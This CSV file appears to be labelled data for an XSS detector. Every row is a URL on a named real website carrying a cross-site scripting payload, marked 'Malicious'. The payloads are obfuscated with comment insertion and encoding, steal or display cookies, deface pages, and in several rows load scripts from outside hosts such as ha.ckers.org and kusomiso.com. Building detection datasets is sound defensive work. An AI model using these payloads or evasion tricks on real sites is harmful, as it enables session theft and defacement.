Payloads,Class
http://big5.fmprc.gov.cn/gate/big5/mail.amb-chine.fr/badlogin.php?tid=0&amp;lid=&quot;&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;alert`document<br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->>.cookie`&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;&lt;p+,Malicious
http://ec.europa.eu/justice/fdad/cms/stopdiscrimination/config/searchresult.html?query=%3c<!--Comment-->br/%3e%3cbr/<!--Comment-->%3e%3ch1<!--Comment-->%3e%3c<!--Comment-->h1%3eclassification%20of%20humans%3c<!--Comment-->/h1%3e%3c/h1<!--Comment-->%3e%201%20real%20item%20found%20:%3cbr/<!--Comment-->%3e%3cbr/<!--Comment-->%3e%3cimg%20src=%22http://3.bp.blogspot.com/-vx_myzeyhjm/thzgak5etci/aaaaaaaaip4/8cjltulti5i/s1600/tintin-au-congo-decision-le-5-mai-2010-01.jpg%22/<!--Comment-->%3e%3c<!--Comment-->img%20src=%22http://3.bp.blogspot.com/-vx_myzeyhjm/thzgak5etci/aaaaaaaaip4/8cjltulti5i/s1600/tintin-au-congo-decision-le-5-mai-2010-01.jpg%22/%3e&x=11&y=7,Malicious
http://www.gm.com/scripts/searchserver.exe?query=%22%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3ealert`'!'`;%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e&amp;method=m<br<!--Comment--><br<!--Comment-->><br<!--Comment--><br<!--Comment-->>ainquery&amp;submit=submit,Malicious
http://www.freeauctions.co.nz/signinform.php?msg=&quot;&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;alert`document.cookie`&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&gt;&lt;marquee<!--Comment-->&gt;&lt;<!--Comment-->marquee&gt;<br<!--Comment-->><br<!--Comment-->>&lt;<!--Comment-->h1&gt;&lt;<!--Comment-->h1&gt;backdoor&lt;/h1<!--Comment-->&gt;&lt;/h1<!--Comment-->&gt;&lt;<!--Comment-->/marquee&gt;&lt;<!--Comment-->/marquee&gt;,Malicious
http://www.playbytherules.net.au/site/home/search.jsp?str=%27%27%22%3e%3c<!--Comment-->/title%3e%3c/title<!--Comment-->%3e%3c<!--Comment-->script%3e%3cscript<!--Comment-->%3ealert`<br<!--Comment-->><br<!--Comment-->>1337`%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3e%3cmarquee<!--Comment-->%3e%3cmarquee<!--Comment-->%3e%3c<!--Comment-->h1%3e%3c<!--Comment-->h1%3exss%20by%20xylitol%3c<!--Comment-->/h1%3e%3c<!--Comment-->/h1%3e%3c<!--Comment-->/marquee%3e%3c<!--Comment-->/marquee%3e%22%3e%3c%2ftitle<br<!--Comment-->>%3e%3c%2ftitle<br<!--Comment-->>%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3ealert`1337`%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3e%3cmarquee<!--Comment-->%3e%3c<!--Comment-->marquee%3e%3ch1<!--Comment-->%3e%3c<!--Comment-->h1%3exss+by+xylitol%3c%2fh1<!--Comment-->%3e%3c<!--Comment-->%2fh1%3e%3c<!--Comment-->%2fmarq<br>uee%3e%3c%2fmarq<br>uee<!--Comment-->%3e&amp;type=false&amp;rpp=10&amp;rst=&amp;orderby=title&amp;daysold=&amp;page=1&amp;xcid=783,Malicious
http://us.creative.com/contactus/subscription/emailnotvalid.asp?email=%3cscript<!--Comment-->%3e%3c<!--Comment-->script%3ealert`document.coo<br<!--Comment-->><br<!--Comment-->>kie`%3c<!--Comment-->/script%3e%3c/script<!--Comment-->%3e,Malicious
http://servicios.invertia.com/foros/read.asp?idmen=2721428&amp;idtel=&quot;&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;alert`document.cookie`&lt;/s<br<!--Comment-->>cript&gt;&lt;/s<br<!--Comment-->>cript&gt;,Malicious
http://arcadascafe.com/odeme.asp?defurunid=%22%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3ealert`%22document.cookie%22`%3c/script%<br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->>3e,Malicious
http://www.departure.at/jart/prj3/departure_website/main.jart?rel=de&amp;reserve-mode=active&amp;content-id=<br<!--Comment-->><br<!--Comment-->>1160330080062&amp;presse_id=1205179855923}%3c<!--Comment-->/style%3e%3c/style<!--Comment-->%3e%3cscript<!--Comment-->%3e%3c<!--Comment-->script%3ea=eval;b=alert;a`b`/xss/.source``;%3c/<br>script<!--Comment-->%3e%3c<!--Comment-->/<br>script%3e,Malicious
http://www.timeshighereducation.co.uk/jobs_jobdetails.asp?ac=67006%27%22%3e%3c<!--Comment-->/title%3e%3c/title<!--Comment-->%3e%3cscript<!--Comment-->%3e%3c<!--Comment-->script%3ea<br<!--Comment-->><br<!--Comment-->>lert`1337`%3c/script<!--Comment-->%3e%3c<!--Comment-->/script%3e%27%22%3e%3cmarquee<!--Comment-->%3e%3cmarquee<!--Comment-->%3e%3ch1<!--Comment-->%3e%3c<!--Comment-->h1%3exxxxxxxxx%3c/h1<!--Comment-->%3e%3c/h1<!--Comment-->%3e%3c<!--Comment-->/marquee%3e%3c<!--Comment-->/marquee%3e,Malicious
http://seguranca.mec.gov.br/?sist=%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3ealert`%22security%20sux%22`%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e,Malicious
http://u-dvd.mgf5.com/ranklink186/ranklink.cgi?id=%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3ealert`/xss/`%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e,Malicious
http://www.yourporntube.com/search_results.php?s=r&amp;search1=%3c<!--Comment-->script+src%3dhttp%3a%2f%2fha.ckers.org<br>%2fs.js%3e%3c<!--Comment-->script+src%3dhttp%3a%2f%2fha.ckers.org<br>%2fs.js%3e%3cscript+src%3dhttp%3a%2f%2fha.ckers.org<br<!--Comment-->>%2fs.js%3e%3cscript+src%3dhttp%3a%2f%2fha.ckers.org<br<!--Comment-->>%2fs.js%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e&amp;search_type=search_videos&amp;search=,Malicious
http://www.argus-braeu.at/cms/index.php?page=&quot;&gt;&lt;<!--Comment-->script&gt;&lt;script<!--Comment-->&gt;alert`document.cookie`&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;&gt;&lt;marquee<!--Comment-->&gt;&lt;<!--Comment-->marquee&gt;&lt;<!--Comment-->h1&gt;&lt;<!--Comment-->h1&gt;<br<!--Comment-->><br<!--Comment-->>backdoor&lt;/h1<!--Comment-->&gt;&lt;<!--Comment-->/h1&gt;&lt;<!--Comment-->/marquee&gt;&lt;/marquee<!--Comment-->&gt;,Malicious
http://www.kruechtener-getraenkemarkt.de/cms/index.php?page=&quot;&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;alert`document.cookie`&lt;/script<br<!--Comment-->>&gt;&lt;/script<br<!--Comment-->>&gt;&gt;&lt;marquee<!--Comment-->&gt;&lt;marquee<!--Comment-->&gt;&lt;<!--Comment-->h1&gt;&lt;h1<!--Comment-->&gt;backdoor&lt;/h1<!--Comment-->&gt;&lt;/h1<!--Comment-->&gt;&lt;<!--Comment-->/marquee&gt;&lt;<!--Comment-->/marquee&gt;,Malicious
http://www.mediamente.rai.it/search.asp?invio=ok&amp;key=%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3ealert%28%27someone%5cn%5cshould%5cn<br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->>have%5cndone%5cna%5cnbetter%5cnjob%5cn%27%29%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e&amp;submit=cerca,Malicious
http://roma.bakeca.it/tutte-le-categorie-0?%22%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3ealert`document.cookie`;%3c<!--Comment-->/sc<br>ript%3e%3c/sc<br<!--Comment-->>ript%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e,Malicious
http://www.psp.gov.ab.ca/index.cfm?page=&quot;&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;alert`document.cookie`&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;&gt;&lt;marquee<!--Comment-->&gt;&lt;<!--Comment-->marquee&gt;&lt;h1<!--Comment-->&gt;&lt;<!--Comment-->h1&gt;by+na<br<!--Comment-->><br<!--Comment-->>rcoticxs&lt;/h1<!--Comment-->&gt;&lt;<!--Comment-->/h1&gt;&lt;<!--Comment-->/marquee&gt;&lt;<!--Comment-->/marquee&gt;,Malicious
http://danno001.u.la/orz.cgi/-/xssed.com/'%3e%22%3e'%3e%3c<!--Comment-->script%3e%3cscript<!--Comment-->%3ealert`%22xss%20by%20kusomiso.com%<br<!--Comment-->><br<!--Comment-->>22`%3c<!--Comment-->/script%3e%3c/script<!--Comment-->%3e,Malicious
http://search.chinadaily.com.cn/searchen.jsp?searchtext=%22%3e%3cmarquee<!--Comment-->%3e%3cmarquee<!--Comment-->%3e%3cmarquee<!--Comment-->%3e%3cmarquee<!--Comment-->%3edefaced%20by%20sponsfull%<br<!--Comment--><br<!--Comment-->><br<!--Comment--><br<!--Comment-->>3c%2fmarquee%3e&amp;ch=all,Malicious
http://learn.doubleclick.com/login.asp?sessionid=%22%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3ealert`/trlink.net/`%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e,Malicious
http://question.sitesell.com/%27%22%3e%3c/title<!--Comment-->%3e%3c/title<!--Comment-->%3e%3c/title<!--Comment-->%3e%3c/title<!--Comment-->%3e%3c<!--Comment-->/title%3e%3c<!--Comment-->/title%3e%3c<!--Comment-->/title%3e%3c<!--Comment-->/title%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3ealert`1337`%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3e%3c<!--Comment-->marquee%<br>3e%3ch1%3e%3c<!--Comment-->marquee%<br>3e%3ch1%3e%3c<!--Comment-->marquee%<br>3e%3ch1%3e%3c<!--Comment-->marquee%<br>3e%3ch1%3e%3cmarquee%<br>3e%3ch1<!--Comment-->%3e%3cmarquee%<br>3e%3ch1<!--Comment-->%3e%3cmarquee%<br>3e%3ch1<!--Comment-->%3e%3cmarquee%<br>3e%3ch1<!--Comment-->%3exss%20by%20xylitol%3c<!--Comment-->/h1%3e%3c<!--Comment-->/h1%3e%3c<!--Comment-->/h1%3e%3c<!--Comment-->/h1%3e%3c/h1<!--Comment-->%3e%3c/h1<!--Comment-->%3e%3c/h1<!--Comment-->%3e%3c/h1<!--Comment-->%3e%3c<!--Comment-->/marquee%3e%3c<!--Comment-->/marquee%3e%3c<!--Comment-->/marquee%3e%3c<!--Comment-->/marquee%3e%3c/marquee<!--Comment-->%3e%3c/marquee<!--Comment-->%3e%3c/marquee<!--Comment-->%3e%3c/marquee<!--Comment-->%3e,Malicious
"http://www.raumankameraseura.net/phpu/index.php?s=content&amp;p=history%22%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3ealert%28string.<br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->>fromcharcode%2867,114,52,116,51,114,32,87,97,115,32,72,101,114,101%29%29%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e",Malicious
http://case.webmastak.info/search.php?q=%22%3e%3ciframe%20src=javascript:alert`123`<!--Comment-->%3e%3c<!--Comment-->iframe%20src=javascript:alert`123`%3e&amp;aff=25236&amp;saf<br<!--Comment-->><br<!--Comment-->>f=3,Malicious
http://ejang.new21.org/blog/tt/?action=index&amp;setdate=200703&amp;setday=21%22%3e%27%3e%3c%73%63%72%69%70%<br<!--Comment-->>74%3e%3c%73%63%72%69%70%<br<!--Comment-->>74%3e%3c%73%63%72%69%70%<br<!--Comment-->>74%3e%3c%73%63%72%69%70%<br<!--Comment-->>74%3e%3c%73%63%72%69%70%<br<!--Comment-->>74%3e%3c%73%63%72%69%70%<br<!--Comment-->>74%3e%3c%73%63%72%69%70%<br<!--Comment-->>74%3e%3c%73%63%72%69%70%<br<!--Comment-->>74%3e%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%38%38%2c%38%33%2<br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->>c%38%33%29%29%3c<!--Comment-->%2f%73%63%72%69%70%74%3e%3c<!--Comment-->%2f%73%63%72%69%70%74%3e%3c<!--Comment-->%2f%73%63%72%69%70%74%3e%3c<!--Comment-->%2f%73%63%72%69%70%74%3e%3c%2f%73%63%72%69%70%74<!--Comment-->%3e%3c%2f%73%63%72%69%70%74<!--Comment-->%3e%3c%2f%73%63%72%69%70%74<!--Comment-->%3e%3c%2f%73%63%72%69%70%74<!--Comment-->%3e%0a&amp;page=1,Malicious
http://www.excite.co.jp/bbs/blog/all/thread?mode=id&amp;t=1143553'%3e%22%3e%3cscript/src=http://kusomiso<br<!--Comment-->>.com/xss.js%3e%3cscript/src=http://kusomiso<br<!--Comment-->>.com/xss.js%3e%3c<!--Comment-->script/src=http://kusomiso<br>.com/xss.js%3e%3c<!--Comment-->script/src=http://kusomiso<br>.com/xss.js%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e&amp;m=1&amp;submit22=%95%5c%8e%a6,Malicious
http://www.uruslular.com/galeri/igallery.asp?d=&quot;&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;alert`'xss'`&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;&gt;&lt;marquee<!--Comment-->&gt;&lt;marquee<!--Comment-->&gt;&lt;marquee<!--Comment-->&gt;&lt;marquee<!--Comment-->&gt;&lt;marquee<!--Comment-->&gt;&lt;marquee<!--Comment-->&gt;&lt;marquee<!--Comment-->&gt;&lt;marquee<!--Comment-->&gt;&lt;marquee<!--Comment-->&gt;&lt;marquee<!--Comment-->&gt;&lt;marquee<!--Comment-->&gt;&lt;marquee<!--Comment-->&gt;&lt;marquee<!--Comment-->&gt;&lt;marquee<!--Comment-->&gt;&lt;marquee<!--Comment-->&gt;&lt;marquee<!--Comment-->&gt;&lt;h1<!--Comment-->&gt;&lt;h1<!--Comment-->&gt;&lt;h1<!--Comment-->&gt;&lt;h1<!--Comment-->&gt;&lt;h1<!--Comment-->&gt;&lt;h1<!--Comment-->&gt;&lt;h1<!--Comment-->&gt;&lt;h1<!--Comment-->&gt;&lt;h1<!--Comment-->&gt;&lt;h1<!--Comment-->&gt;&lt;h1<!--Comment-->&gt;&lt;h1<!--Comment-->&gt;&lt;h1<!--Comment-->&gt;&lt;h1<!--Comment-->&gt;&lt;h1<!--Comment-->&gt;&lt;h1<!--Comment-->&gt;by+narco<br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->>ticxs&lt;/h1<!--Comment-->&gt;&lt;/h1<!--Comment-->&gt;&lt;/h1<!--Comment-->&gt;&lt;/h1<!--Comment-->&gt;&lt;/h1<!--Comment-->&gt;&lt;/h1<!--Comment-->&gt;&lt;/h1<!--Comment-->&gt;&lt;/h1<!--Comment-->&gt;&lt;/h1<!--Comment-->&gt;&lt;/h1<!--Comment-->&gt;&lt;/h1<!--Comment-->&gt;&lt;/h1<!--Comment-->&gt;&lt;/h1<!--Comment-->&gt;&lt;/h1<!--Comment-->&gt;&lt;/h1<!--Comment-->&gt;&lt;/h1<!--Comment-->&gt;&lt;/marquee<!--Comment-->&gt;&lt;/marquee<!--Comment-->&gt;&lt;/marquee<!--Comment-->&gt;&lt;/marquee<!--Comment-->&gt;&lt;/marquee<!--Comment-->&gt;&lt;/marquee<!--Comment-->&gt;&lt;/marquee<!--Comment-->&gt;&lt;/marquee<!--Comment-->&gt;&lt;<!--Comment-->/marquee&gt;&lt;<!--Comment-->/marquee&gt;&lt;<!--Comment-->/marquee&gt;&lt;<!--Comment-->/marquee&gt;&lt;<!--Comment-->/marquee&gt;&lt;<!--Comment-->/marquee&gt;&lt;<!--Comment-->/marquee&gt;&lt;<!--Comment-->/marquee&gt;,Malicious
http://www.ura.go.ug/intranet/exec/login.intranet?login=%27%22%3e%3c<!--Comment-->%2ftitle%3e%3c%2ftitle<!--Comment-->%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3ealert`133<br<!--Comment-->><br<!--Comment-->>7`%3c<!--Comment-->%2fscript%3e%3c%2fscript<!--Comment-->%3e%3e%3c<!--Comment-->marquee%3e%3cmarquee<!--Comment-->%3e%3ch1<!--Comment-->%3e%3c<!--Comment-->h1%3exss+by+xylitol%3c<!--Comment-->%2fh1%3e%3c<!--Comment-->%2fh1%3e%3c<!--Comment-->%2fmarquee%3e%3c<!--Comment-->%2fmarquee%3e&amp;password=%27%22%3<br<!--Comment-->><br<!--Comment-->>e%3c%2ftitle<!--Comment-->%3e%3c%2ftitle<!--Comment-->%3e%3c<!--Comment-->script%3e%3cscript<!--Comment-->%3ealert`1337`%3c%2fscript<!--Comment-->%3e%3c<!--Comment-->%2fscript%3e%3e%3cmarquee<!--Comment-->%3e%3cmarquee<!--Comment-->%3e%3ch1<!--Comment-->%3e%3c<!--Comment-->h1%3exss+by+xylitol%3c%2fh1%<br>3e%3c<!--Comment-->%2fmarquee%3e%3c%2fh1%<br>3e%3c<!--Comment-->%2fmarquee%3e&amp;submit=log+in!,Malicious
http://www.ericssonclub.org/vbulletin/downloads.php?do=cat&amp;id=6%22%3e%3cscript<!--Comment-->%3e%3c<!--Comment-->script%3ealert`%22critia!!%2<br<!--Comment-->><br<!--Comment-->>0vbulletin%20xssed%20\ncookie%20editor%22`%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e,Malicious
http://www.saopaulo.sp.gov.br/sis/searchwww.php?qu=%22%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3ealert`/xss/`;%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e,Malicious
http://www.cher.pref.gouv.fr/recherche.php?mot=%22%3e%27%3e%3cscript+src%3dhttp%3a%2f%2fvuln.xssed.n<br>et%2fthirdparty%2fscripts%2fpython5.js<!--Comment-->%3e%3cscript+src%3dhttp%3a%2f%2fvuln.xssed.n<br>et%2fthirdparty%2fscripts%2fpython5.js<!--Comment-->%3e%3c<!--Comment-->script+src%3dhttp%3a%2f%2fvuln.xssed.n<br>et%2fthirdparty%2fscripts%2fpython5.js%3e%3c<!--Comment-->script+src%3dhttp%3a%2f%2fvuln.xssed.n<br>et%2fthirdparty%2fscripts%2fpython5.js%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e&amp;x=5&amp;y=11,Malicious
http://www.freeonlinegames.com/search.php?cat%5fgame=22&amp;terms=%22%3e%3c%73%63%72%69%70%74<!--Comment-->%3e%3c%73%63%72%69%70%74<!--Comment-->%3e%3c%73%63%72%69%70%74<!--Comment-->%3e%3c%73%63%72%69%70%74<!--Comment-->%3e%3c<!--Comment-->%73%63%72%69%70%74%3e%3c<!--Comment-->%73%63%72%69%70%74%3e%3c<!--Comment-->%73%63%72%69%70%74%3e%3c<!--Comment-->%73%63%72%69%70%74%3e%61%6c%6<br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->>5%72%74%28%22%41%6d%61%7a%65%64%3f%20%2d%20%53%74%75%61%72%74%79%22%29%3c<!--Comment-->%2f%73%63%72%69%70%74%3e%3c<!--Comment-->%2f%73%63%72%69%70%74%3e%3c<!--Comment-->%2f%73%63%72%69%70%74%3e%3c<!--Comment-->%2f%73%63%72%69%70%74%3e%3c<!--Comment-->%2f%73%63%72%69%70%74%3e%3c<!--Comment-->%2f%73%63%72%69%70%74%3e%3c<!--Comment-->%2f%73%63%72%69%70%74%3e%3c<!--Comment-->%2f%73%63%72%69%70%74%3e&amp;re<br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->>q=search,Malicious
http://www.kawagoe-navi.com/scripts/kayit.asp?id=3558&amp;dil=tr&amp;page=grup.asp&amp;results=&quot;&gt;&lt;<!--Comment-->script&gt;&lt;script<!--Comment-->&gt;alert`d<br<!--Comment-->><br<!--Comment-->>ocument.cookie`&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;,Malicious
http://www5.jcpenney.com/jcp/searchdepartment.aspx?searchstring=%22%3cscript+src%3dhttp://vuln.xssed<br>.net/thirdparty/scripts/hotpockets.js<!--Comment-->%3e%3cscript+src%3dhttp://vuln.xssed<br>.net/thirdparty/scripts/hotpockets.js<!--Comment-->%3e%3cscript+src%3dhttp://vuln.xssed<br>.net/thirdparty/scripts/hotpockets.js<!--Comment-->%3e%3cscript+src%3dhttp://vuln.xssed<br>.net/thirdparty/scripts/hotpockets.js<!--Comment-->%3e%3cscript+src%3dhttp://vuln.xssed<br<!--Comment-->>.net/thirdparty/scripts/hotpockets.js%3e%3cscript+src%3dhttp://vuln.xssed<br<!--Comment-->>.net/thirdparty/scripts/hotpockets.js%3e%3cscript+src%3dhttp://vuln.xssed<br<!--Comment-->>.net/thirdparty/scripts/hotpockets.js%3e%3cscript+src%3dhttp://vuln.xssed<br<!--Comment-->>.net/thirdparty/scripts/hotpockets.js%3e,Malicious
http://www.erbol.com.bo/opinion.php?id=%27%22%3e%3c<!--Comment-->img%20src=foo.png%20onerror=alert`/xss/`%20/%3e%3c<!--Comment-->img%20src=foo.png%20onerror=alert`/xss/`%20/%3e%3<br<!--Comment-->><br<!--Comment-->>cmarquee%20bgcolor=%22red%22%3e%3ch1<!--Comment-->%3e%3ch1<!--Comment-->%3exss%20by%20xylitol%3c<!--Comment-->/h1%3e%3c/h1<!--Comment-->%3e%3c<!--Comment-->/marquee%3e%3c<!--Comment-->/marquee%3e,Malicious
